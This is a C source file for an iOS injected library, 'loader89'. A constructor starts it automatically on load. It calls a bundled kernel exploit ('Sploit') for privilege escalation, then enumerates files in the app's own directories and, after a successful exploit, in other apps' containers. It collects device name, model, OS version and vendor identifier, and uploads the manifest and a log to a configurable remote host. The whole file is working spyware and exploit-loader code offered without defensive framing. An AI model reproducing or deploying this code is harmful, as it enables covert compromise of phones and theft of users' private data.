/* loader89.c - 89yl 双链路加载器 v3
 * 1) AcqViewCntrlr_ RunServer + Sploit（exploit -> kernel R/W -> 提权 -> 采集）
 * 2) 失败/不可用时 fallback：枚举可访问容器目录，生成 manifest 并上传
 * 3) 全程日志：Documents/loader89.log + NSLog + 自动 POST /log
 */
typedef unsigned long u64;
typedef long long i64;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern void *malloc(unsigned long);
extern void free(void *);
extern void *memcpy(void *, const void *, unsigned long);
extern unsigned long strlen(const char *);
extern int snprintf(char *, unsigned long, const char *, ...);
extern int open(const char *, int, ...);
extern int close(int);
extern long write(int, const void *, unsigned long);
extern unsigned int sleep(unsigned int);
extern long time(void *);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_detach(void *);
extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
extern char *getenv(const char *);

#define RTLD_DEFAULT ((void *)-2)
#define O_WRONLY 1
#define O_CREAT 0x200
#define O_APPEND 8
#define O_TRUNC 0x400

#define LOADER89_SKIP_CORE 0
#define LOADER89_DEFAULT_HOST "192.168.1.167"
#define LOADER89_DEFAULT_PORT 8080

#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

static void *(*p_dlsym)(void *, const char *);
static void *(*p_msgSend)();
static void *(*p_getClass)(const char *);
static void *(*p_sel)(const char *);
static void *(*p_nslog)();
static void *(*p_retain)(void *);
static void *(*p_release)(void *);
static int g_logfd = -1;
static char g_logpath[512];
static char g_host[128];
static int g_port = LOADER89_DEFAULT_PORT;

static void raw_log(const char *s) {
    if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
    if (p_nslog && p_getClass && p_msgSend && p_sel) {
        void *nsstring = p_getClass("NSString");
        if (nsstring) {
            void *s2 = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)s);
            if (s2) p_nslog(s2);
        }
    }
}

static void log_line(const char *level, const char *msg) {
    char ts[32], buf[1200];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    snprintf(buf, sizeof(buf), "{\"ts\":%s,\"level\":\"%s\",\"msg\":\"%s\"}", ts, level, msg);
    raw_log(buf);
}

static void log_info(const char *msg) { log_line("info", msg); }
static void log_warn(const char *msg) { log_line("warn", msg); }
static void log_error(const char *msg) { log_line("error", msg); }

static void log_u64(const char *tag, u64 v) {
    char buf[180];
    snprintf(buf, sizeof(buf), "%s%llu", tag, (unsigned long long)v);
    log_info(buf);
}

static char *cat3(const char *a, const char *b, const char *c) {
    unsigned long n = strlen(a) + strlen(b) + strlen(c) + 1;
    char *p = (char *)malloc(n);
    unsigned long i = 0, j;
    for (j = 0; a[j]; j++) p[i++] = a[j];
    for (j = 0; b[j]; j++) p[i++] = b[j];
    for (j = 0; c[j]; j++) p[i++] = c[j];
    p[i] = 0;
    return p;
}

static void json_escape(char *dst, unsigned long dstn, const char *src) {
    unsigned long i = 0, o = 0;
    while (src[i] && o + 6 < dstn) {
        char c = src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = c; }
        else if (c >= 0x20 && (unsigned char)c < 0x80) dst[o++] = c;
        else { dst[o++] = '?'; }
        i++;
    }
    dst[o] = 0;
}

static int walk_dir(const char *base, const char *rel, char *out, unsigned long *used,
                    unsigned long outn, int max_files, int depth) {
    if (depth > 3 || max_files <= 0 || *used + 1 >= outn) return 0;
    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
    DIR *dir = opendir(full);
    free(full);
    if (!dir) return 0;
    int count = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir)) && count < max_files) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
        char *path = cat3(base, "/", r2);
        struct stat st;
        if (lstat(path, &st) == 0) {
            if ((st.st_mode & 0xF000) == 0x4000) {
                count += walk_dir(base, r2, out, used, outn, max_files - count, depth + 1);
            } else {
                char jp[512], esc[400];
                json_escape(esc, sizeof(esc), r2);
                int n = snprintf(jp, sizeof(jp), "{\"path\":\"%s\",\"size\":%lld}", esc, (long long)st.st_size);
                if (n > 0 && *used + (unsigned long)n + 2 < outn) {
                    if (*used > 0) out[(*used)++] = ',';
                    for (int k = 0; k < n; k++) out[(*used)++] = jp[k];
                    count++;
                }
            }
        }
        if (r2 != (char *)nm) free(r2);
        free(path);
    }
    closedir(dir);
    if (*used < outn) out[*used] = 0;
    return count;
}

static void sysctl_str(const char *name, char *out, unsigned long outn) {
    char buf[160];
    unsigned long n = sizeof(buf);
    if (sysctlbyname(name, buf, &n, 0, 0) == 0) {
        unsigned long i = 0;
        for (; i < outn - 1 && i < n && buf[i]; i++) out[i] = buf[i];
        out[i] = 0;
    } else out[0] = 0;
}

static char *objc_cstr(void *obj) {
    if (!obj) return 0;
    const char *s = (const char *)p_msgSend(obj, p_sel("UTF8String"));
    if (!s) return 0;
    unsigned long n = strlen(s);
    char *out = (char *)malloc(n + 1);
    for (unsigned long i = 0; i <= n; i++) out[i] = s[i];
    return out;
}

static char *info_string(const char *key) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return 0;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    return objc_cstr(obj);
}

static long info_int(const char *key, long fallback) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return fallback;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    if (!obj) return fallback;
    long v = (long)p_msgSend(obj, p_sel("intValue"));
    return v ? v : fallback;
}

static char *device_string(const char *selector) {
    void *dev = p_msgSend(p_getClass("UIDevice"), p_sel("currentDevice"));
    if (!dev) return 0;
    return objc_cstr(p_msgSend(dev, p_sel(selector)));
}

static void read_runtime_config(void) {
    char *h = info_string("Loader89Host");
    if (h && h[0]) {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && h[i]; i++) g_host[i] = h[i];
        g_host[i] = 0;
    } else {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && LOADER89_DEFAULT_HOST[i]; i++) g_host[i] = LOADER89_DEFAULT_HOST[i];
        g_host[i] = 0;
    }
    if (h) free(h);
    g_port = (int)info_int("Loader89Port", LOADER89_DEFAULT_PORT);
    if (g_port <= 0 || g_port > 65535) g_port = LOADER89_DEFAULT_PORT;
}

static void init_log(void) {
    char *home = getenv("HOME");
    char *p = cat3(home ? home : "/var/mobile", "/Documents/loader89.log", "");
    unsigned long i = 0;
    for (; i < sizeof(g_logpath) - 1 && p[i]; i++) g_logpath[i] = p[i];
    g_logpath[i] = 0;
    g_logfd = open(g_logpath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    free(p);
}

static void post_log_now(void) {
    if (!g_host[0] || g_logfd < 0) return;
    void *nsstring = p_getClass("NSString");
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/log", g_host, g_port);
    void *urlStr = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), url);
    void *nsurl = p_msgSend(p_getClass("NSURL"), p_sel("URLWithString:"), urlStr);
    if (!nsurl) return;
    void *req = p_msgSend(p_getClass("NSMutableURLRequest"), p_sel("requestWithURL:"), nsurl);
    if (!req) return;
    p_msgSend(req, p_sel("setHTTPMethod:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), "POST"));
    void *data = p_msgSend(p_getClass("NSData"), p_sel("dataWithContentsOfFile:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), g_logpath));
    if (!data) return;
    p_msgSend(req, p_sel("setHTTPBody:"), data);
    void *resp = 0, *err = 0;
    void *ret = p_msgSend(p_getClass("NSURLConnection"), p_sel("sendSynchronousRequest:returningResponse:error:"), req, &resp, &err);
    log_info(ret ? "log upload OK" : "log upload FAIL");
}

static void *run_server_worker(void *arg) {
    void *inst = arg;
    if (inst) {
        log_info("RunServer start");
        p_msgSend(inst, p_sel("RunServer"));
        log_info("RunServer returned");
    }
    return 0;
}

static void *upload_manifest(int exploit_ok, const char *source) {
    void *cls = p_getClass("_CSDataExchange");
    if (!cls) { log_error("CSDataExchange missing"); return 0; }
    void *nsstring = p_getClass("NSString");
    void *sel_str_u8 = p_sel("stringWithUTF8String:");
    void *inst = p_msgSend(p_msgSend(cls, p_sel("alloc")), p_sel("initWithHost:port:"),
                           p_msgSend(nsstring, sel_str_u8, g_host), (void *)(long)g_port);
    if (!inst) { log_error("CSDataExchange init FAIL"); return 0; }

    void *err = 0;
    long ok = (long)p_msgSend(inst, p_sel("handshakeWithError:"), &err);
    log_info(ok ? "handshake OK" : "handshake FAIL");
    if (!ok) { p_release(inst); return 0; }

    err = 0;
    long ok2 = (long)p_msgSend(inst, p_sel("startAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    log_info(ok2 ? "startAcquisition OK" : "startAcquisition FAIL");
    if (!ok2) { p_release(inst); return 0; }

    char files[24576];
    files[0] = 0;
    unsigned long used = 0;
    int nfiles = 0;
    char *home = getenv("HOME");
    if (home) {
        char *docs = cat3(home, "/Documents", "");
        nfiles += walk_dir(docs, "", files, &used, sizeof(files), 180, 0);
        free(docs);
        char *lib = cat3(home, "/Library", "");
        nfiles += walk_dir(lib, "", files, &used, sizeof(files), 120, 0);
        free(lib);
    }
    if (exploit_ok) {
        nfiles += walk_dir("/var/mobile/Containers/Data/Application", "", files, &used, sizeof(files), 60, 1);
        nfiles += walk_dir("/var/mobile/Containers/Shared/AppGroup", "", files, &used, sizeof(files), 40, 1);
    }
    log_u64("manifest files=", (u64)nfiles);

    char model[80], sysver[80], deviceName[160], idfv[120], bundleId[160], appVersion[80];
    sysctl_str("hw.machine", model, sizeof(model));
    char *sv = device_string("systemVersion");
    if (sv) { unsigned long i = 0; for (; i < sizeof(sysver) - 1 && sv[i]; i++) sysver[i] = sv[i]; sysver[i] = 0; free(sv); } else { sysctl_str("kern.osrelease", sysver, sizeof(sysver)); }
    char *dn = device_string("name");
    if (dn) { unsigned long i = 0; for (; i < sizeof(deviceName) - 1 && dn[i]; i++) deviceName[i] = dn[i]; deviceName[i] = 0; free(dn); } else deviceName[0] = 0;
    char *iv = device_string("identifierForVendor");
    if (iv) { unsigned long i = 0; for (; i < sizeof(idfv) - 1 && iv[i]; i++) idfv[i] = iv[i]; idfv[i] = 0; free(iv); } else idfv[0] = 0;
    char *bid = info_string("CFBundleIdentifier");
    if (bid) { unsigned long i = 0; for (; i < sizeof(bundleId) - 1 && bid[i]; i++) bundleId[i] = bid[i]; bundleId[i] = 0; free(bid); } else bundleId[0] = 0;
    char *av = info_string("CFBundleShortVersionString");
    if (av) { unsigned long i = 0; for (; i < sizeof(appVersion) - 1 && av[i]; i++) appVersion[i] = av[i]; appVersion[i] = 0; free(av); } else appVersion[0] = 0;

    char eName[64], eSource[64];
    json_escape(eName, sizeof(eName), model);
    json_escape(eSource, sizeof(eSource), source);
    char ts[32];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    char *body = (char *)malloc(24576);
    unsigned long bo = 0;
    int n = snprintf(body + bo, 24576 - bo,
        "{\"deviceName\":\"%s\",\"model\":\"%s\",\"systemName\":\"iOS\",\"systemVersion\":\"%s\","
        "\"identifierForVendor\":\"%s\",\"appBundle\":\"%s\",\"appVersion\":\"%s\","
        "\"collectedAt\":%s,\"exploit\":%s,\"source\":\"%s\",\"sandboxFiles\":[",
        deviceName, eName, sysver, idfv, bundleId, appVersion, ts, exploit_ok ? "true" : "false", eSource);
    bo += n;
    for (unsigned long k = 0; k < used && bo < 24000; k++) body[bo++] = files[k];
    n = snprintf(body + bo, 24576 - bo, "]}");
    bo += n;
    log_u64("manifest bytes=", (u64)bo);

    void *nsdata = p_getClass("NSData");
    void *data = p_msgSend(nsdata, p_sel("dataWithBytes:length:"), body, (unsigned long)bo);
    free(body);
    if (!data) { log_error("NSData FAIL"); p_release(inst); return 0; }

    err = 0;
    long ok3 = (long)p_msgSend(inst, p_sel("uploadChunk:acquisitionType:fileName:error:"), data,
                               p_msgSend(nsstring, sel_str_u8, "filesystem"),
                               p_msgSend(nsstring, sel_str_u8, "loader89_manifest.json"), &err);
    log_info(ok3 ? "uploadChunk OK" : "uploadChunk FAIL");

    err = 0;
    p_msgSend(inst, p_sel("endAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    err = 0;
    p_msgSend(inst, p_sel("endSessionWithError:"), &err);
    p_release(inst);
    return (void *)(long)(ok && ok2 && ok3);
}

static void *worker(void *arg) {
    (void)arg;
    sleep(2);
    init_log();
    p_dlsym = (void *(*)(void *, const char *))dlsym(RTLD_DEFAULT, "dlsym");
    p_msgSend = (void *(*)())dlsym(RTLD_DEFAULT, "objc_msgSend");
    p_getClass = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "objc_getClass");
    p_sel = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "sel_registerName");
    p_nslog = (void *(*)())dlsym(RTLD_DEFAULT, "NSLog");
    p_retain = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_retain");
    p_release = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_release");
    if (!p_msgSend || !p_getClass || !p_sel || !p_release) { log_error("objc runtime missing"); return 0; }

    log_info("=== loader89 v3 dual-chain start ===");
    read_runtime_config();
    char msg[320];
    snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
    log_info(msg);

    void *core = 0, *sd = 0;
#if LOADER89_SKIP_CORE
    log_info("dlopen core SKIPPED");
#else
    core = dlopen("@executable_path/Frameworks/libwebuiopsercore.framework/libwebuiopsercore", 0xA);
    log_info(core ? "dlopen core OK" : "dlopen core FAIL");
#endif
    sd = dlopen("@executable_path/Frameworks/SDWebuiopser.framework/SDWebuiopser", 0xA);
    log_info(sd ? "dlopen SD OK" : "dlopen SD FAIL");
    if (!core && !sd) { log_error("no components, exit"); return 0; }

    int exploit_ok = 0;
    void *acq = 0;
    void *acqCls = p_getClass("AcqViewCntrlr_");
    log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
    if (acqCls) {
        acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
        log_info(acq ? "AcqViewCntrlr_ instance OK" : "AcqViewCntrlr_ instance FAIL");
        if (acq) {
            static void *serverThread;
            if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
            sleep(1);
            log_info("Sploit start");
            p_msgSend(acq, p_sel("Sploit"));
            log_info("Sploit returned");
            if (core) {
                unsigned char *flag = (unsigned char *)core + 0x6b96d8;
                exploit_ok = *flag;
                snprintf(msg, sizeof(msg), "exploit result=%d flag_addr=%p", exploit_ok, (void *)flag);
                log_info(msg);
            }
            p_release(acq);
            acq = 0;
        }
    }

    void *up = upload_manifest(exploit_ok, exploit_ok ? "exploit" : "fallback");
    log_info(up ? "manifest upload chain OK" : "manifest upload chain FAIL");
    post_log_now();
    log_info("=== loader89 done ===");
    if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
    return 0;
}

static void *g_thread_start;

__attribute__((constructor))
static void loader89_init(void) {
    static void *th;
    void *(*fn)(void *) = worker;
    g_thread_start = (void *)fn;
    if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
}
